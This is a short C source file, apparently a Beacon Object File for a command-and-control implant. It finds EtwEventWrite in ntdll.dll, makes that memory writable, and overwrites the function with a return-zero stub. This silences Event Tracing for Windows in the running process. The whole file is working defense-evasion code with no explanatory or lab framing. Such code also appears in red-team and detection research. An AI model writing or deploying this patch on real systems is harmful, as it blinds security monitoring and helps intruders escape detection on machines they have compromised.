#include <windows.h>
#include "beacon_compat.h"

void go(char *args, int args_len) {
    (void)args; (void)args_len;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ntdll.dll not found\n");
        return;
    }

    void *pFunc = (void *)GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pFunc) {
        BeaconPrintf(CALLBACK_ERROR, "[!] EtwEventWrite not found\n");
        return;
    }

    /* x64: xor rax,rax; ret */
    unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
    DWORD oldProtect;

    if (!VirtualProtect(pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] VirtualProtect failed: %lu\n", GetLastError());
        return;
    }

    memcpy(pFunc, patch, sizeof(patch));
    VirtualProtect(pFunc, sizeof(patch), oldProtect, &oldProtect);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] ETW patched (EtwEventWrite → nop)\n");
}
